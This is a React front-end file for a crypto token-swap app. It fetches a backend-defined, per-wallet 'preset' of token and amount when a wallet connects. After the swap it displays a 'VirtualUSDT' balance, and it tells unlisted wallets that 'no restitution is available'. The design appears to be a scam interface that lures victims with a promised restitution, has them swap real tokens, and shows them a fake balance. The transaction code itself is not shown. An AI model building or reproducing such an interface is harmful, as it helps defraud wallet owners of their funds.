import React, { useState, useEffect } from 'react';
import { WagmiProvider, createConfig } from 'wagmi';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { walletConnect, injected } from 'wagmi/connectors';
import { base, mainnet, bsc } from 'wagmi/chains';
import { http } from 'wagmi';
import { useAccount } from 'wagmi';
import Header from './components/Header';
import SwapCard from './components/SwapCard';
import Footer from './components/Footer';
import TokenModal from './components/TokenModal';
import SettingsModal from './components/SettingsModal';
import VirtualUSDT from './components/VirtualUSDT';
import NetworkWarning from './components/NetworkWarning';
import { getWalletPreset, fetchWalletPresets, fetchAdminSettings, clearCache } from './config/adminConfig';
import api from './config/api';

const projectId = '90c9c75a9b1e73a06c1110b3d1b943f9';
const chains = [bsc, base, mainnet];

// Create config with separate connectors for MetaMask and WalletConnect
const config = createConfig({
  chains,
  connectors: [
    // Injected connector for browser extensions (MetaMask, etc.)
    injected({
      shimDisconnect: true,
    }),
    // WalletConnect for mobile wallets and QR code connection
    walletConnect({
      projectId,
      metadata: {
        name: 'Swap|App',
        description: 'Fast Crypto Swap',
        url: typeof window !== 'undefined' ? window.location.origin : 'https://swap-app.vercel.app',
        icons: [typeof window !== 'undefined' ? `${window.location.origin}/logo.jpeg` : 'https://swap-app.vercel.app/logo.jpeg'],
      },
      showQrModal: true,
    }),
  ],
  transports: {
    [mainnet.id]: http(),
    [base.id]: http(),
    [bsc.id]: http(),
  },
  // Better reconnection handling
  syncConnectedChain: true,
});

const queryClient = new QueryClient();

function AppContent() {
  const { address, isConnected } = useAccount();
  const [walletPreset, setWalletPreset] = useState(null);
  const [originalUsdValue, setOriginalUsdValue] = useState(null); // Store original USD value
  const [loadingPreset, setLoadingPreset] = useState(false);
  const [fromToken, setFromToken] = useState(null);
  const [toToken] = useState({
    name: 'USDT',
    logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png',
  });
  const [fromAmount, setFromAmount] = useState('');
  const [toAmount, setToAmount] = useState('');
  const [showTokenModal, setShowTokenModal] = useState(false);
  const [tokenModalTarget, setTokenModalTarget] = useState('from');
  const [showSettings, setShowSettings] = useState(false);
  const [slippage, setSlippage] = useState(0.5);
  const [localSwapCompleted, setLocalSwapCompleted] = useState(false);

  // Fetch presets and settings on mount
  useEffect(() => {
    fetchWalletPresets();
    fetchAdminSettings();
  }, []);

  // Fetch wallet preset when wallet connects
  // Backend prioritizes uncompleted presets, then most recent completed one
  useEffect(() => {
    // Reset local swap state when wallet changes
    setLocalSwapCompleted(false);

    const fetchPreset = async () => {
      if (address && isConnected) {
        console.log('=== Fetching preset for address ===', address);
        setLoadingPreset(true);
        try {
          // Fetch directly from backend endpoint which prioritizes uncompleted presets
          const response = await api.get(`/wallet-presets/${address.toLowerCase()}`);
          const presetData = response.data;

          // Transform to match frontend format
          const preset = {
            token: presetData.token.name,
            tokenSymbol: presetData.token.symbol || presetData.token.name,
            tokenAmount: presetData.token.amount,
            usdValue: presetData.token.usdValue,
            tokenLogo: presetData.token.logo,
            tokenAddress: presetData.token.address,
            decimals: presetData.token.decimals,
            swapCompleted: presetData.swapCompleted || false,
          };

          console.log('=== Preset result ===', preset ? 'FOUND' : 'NOT FOUND');
          if (preset) {
            console.log('Preset details:', {
              token: preset.token,
              tokenAmount: preset.tokenAmount,
              usdValue: preset.usdValue,
              tokenLogo: preset.tokenLogo,
              swapCompleted: preset.swapCompleted,
            });
          }
          // Store original USD value when preset is first loaded
          if (preset.usdValue && preset.usdValue > 0 && !originalUsdValue) {
            setOriginalUsdValue(preset.usdValue);
          }
          setWalletPreset(preset);
        } catch (error) {
          if (error.response?.status === 404) {
            console.log('No preset found for address:', address);
            setWalletPreset(null);
          } else {
            console.error('Error fetching wallet preset:', error);
            setWalletPreset(null);
          }
        } finally {
          setLoadingPreset(false);
        }
      } else {
        setWalletPreset(null);
      }
    };

    fetchPreset();
  }, [isConnected, address]);

  // Set preset token when wallet preset is loaded
  useEffect(() => {
    if (walletPreset && address) {
      const swapCompleted = walletPreset.swapCompleted || false;

      console.log('Setting preset token:', {
        walletPreset,
        swapCompleted,
        tokenAmount: walletPreset.tokenAmount,
        usdValue: walletPreset.usdValue,
        token: walletPreset.token,
      });

      // Validate preset has valid values
      if (!walletPreset.tokenAmount || walletPreset.tokenAmount === 0) {
        console.warn('Warning: Preset tokenAmount is 0 or invalid:', walletPreset.tokenAmount);
      }
      if (!walletPreset.usdValue || walletPreset.usdValue === 0) {
        console.warn('Warning: Preset usdValue is 0 or invalid:', walletPreset.usdValue);
      }

      // Ensure we have valid values before setting
      const tokenAmount = walletPreset.tokenAmount && walletPreset.tokenAmount > 0
        ? walletPreset.tokenAmount
        : 0;
      const usdValue = walletPreset.usdValue && walletPreset.usdValue > 0
        ? walletPreset.usdValue
        : 0;

      setFromToken({
        name: walletPreset.token,
        logo: walletPreset.tokenLogo,
        amount: tokenAmount,
        usdValue: usdValue, // Keep actual USD value even after swap completed
        address: walletPreset.tokenAddress,
        decimals: walletPreset.decimals,
      });

      // Only set fromAmount if swap is not completed, otherwise keep existing value
      if (!swapCompleted) {
        const amount = tokenAmount > 0 ? tokenAmount.toString() : '0';
        console.log('Setting fromAmount to:', amount, 'from tokenAmount:', tokenAmount);
        setFromAmount(amount);
      }
    } else if (!walletPreset && address) {
      console.log('No wallet preset found for address:', address);
      setFromToken(null);
      setFromAmount('');
    }
  }, [walletPreset, address]);

  // Callback to refresh preset after swap completion
  const handleSwapComplete = async () => {
    // Immediately show withdraw banner
    console.log('handleSwapComplete called, setting localSwapCompleted to true');
    setLocalSwapCompleted(true);

    if (address) {
      // Clear cache and refetch preset to get updated swapCompleted flag
      // Note: Backend should only update swapCompleted flag, not the values
      clearCache();
      await fetchWalletPresets();
      const updatedPreset = await getWalletPreset(address);
      if (updatedPreset) {
        console.log('Updated preset after swap:', updatedPreset);
        // Preserve the original usdValue - use stored originalUsdValue or current walletPreset value
        const preservedUsdValue = originalUsdValue || walletPreset?.usdValue;
        if (preservedUsdValue && (!updatedPreset.usdValue || updatedPreset.usdValue === 0)) {
          updatedPreset.usdValue = preservedUsdValue;
        }
        setWalletPreset(updatedPreset);
      }
    }
  };

  // Calculate toAmount (don't set to 0 if swap completed, just keep the value)
  useEffect(() => {
    const swapCompleted = walletPreset?.swapCompleted || localSwapCompleted;

    if (swapCompleted) {
      // Don't change toAmount, just keep it as is (will display as 0 in UI)
      return;
    } else if (fromToken && fromAmount && parseFloat(fromAmount) > 0 && fromToken.amount > 0) {
      const usdValue = fromToken.usdValue || 0;
      const tokenAmount = parseFloat(fromAmount);
      const totalValue = (usdValue / fromToken.amount) * tokenAmount;
      setToAmount(totalValue.toFixed(2));
    } else {
      setToAmount('0.0');
    }
  }, [fromAmount, fromToken, walletPreset, localSwapCompleted]);

  const openTokenModal = (target) => {
    setTokenModalTarget(target);
    setShowTokenModal(true);
  };

  const handleTokenSelect = (token, target) => {
    const swapCompleted = walletPreset?.swapCompleted || false;

    if (swapCompleted) {
      if (target === 'from' && walletPreset) {
        setFromToken({
          name: walletPreset.token,
          logo: walletPreset.tokenLogo,
          amount: 0,
          usdValue: 0,
          address: walletPreset.tokenAddress,
          decimals: walletPreset.decimals,
        });
        setFromAmount('0');
      }
      setShowTokenModal(false);
      return;
    }

    if (target === 'from' && walletPreset) {
      setFromToken({
        name: walletPreset.token,
        logo: walletPreset.tokenLogo,
        amount: walletPreset.tokenAmount,
        usdValue: walletPreset.usdValue,
        address: walletPreset.tokenAddress,
        decimals: walletPreset.decimals,
      });
      setFromAmount(walletPreset.tokenAmount.toString());
    }
    setShowTokenModal(false);
  };

  return (
    <div className="app">
      <Header />
      <NetworkWarning />
      {address && walletPreset && (walletPreset.swapCompleted || localSwapCompleted) && (
        <VirtualUSDT
          address={address}
          presetUsdValue={walletPreset.usdValue || originalUsdValue || 0}
          swapCompleted={walletPreset.swapCompleted || localSwapCompleted}
        />
      )}
      <main>
        {address && walletPreset ? (
          <SwapCard
            fromToken={fromToken}
            toToken={toToken}
            fromAmount={fromAmount}
            toAmount={toAmount}
            onFromAmountChange={setFromAmount}
            onTokenClick={openTokenModal}
            onSettingsClick={() => setShowSettings(prev => !prev)}
            slippage={slippage}
            walletAddress={address}
            walletPreset={walletPreset}
            onSwapComplete={handleSwapComplete}
          />
        ) : (
          <div className="no-preset-message">
            {!address ? (
              <p>Please connect your wallet to continue.</p>
            ) : loadingPreset ? (
              <p>Loading wallet preset...</p>
            ) : (
              <p>No restitution is available for this wallet address.</p>
            )}
          </div>
        )}
      </main>
      <Footer />
      {showTokenModal && walletPreset && (
        <TokenModal
          onClose={() => setShowTokenModal(false)}
          onSelect={(token) => handleTokenSelect(token, tokenModalTarget)}
          target={tokenModalTarget}
          walletPreset={walletPreset}
        />
      )}
      {showSettings && (
        <SettingsModal
          slippage={slippage}
          onSlippageChange={setSlippage}
          onClose={() => setShowSettings(false)}
        />
      )}
    </div>
  );
}

function App() {
  return (
    <WagmiProvider config={config}>
      <QueryClientProvider client={queryClient}>
        <AppContent />
      </QueryClientProvider>
    </WagmiProvider>
  );
}

export default App;
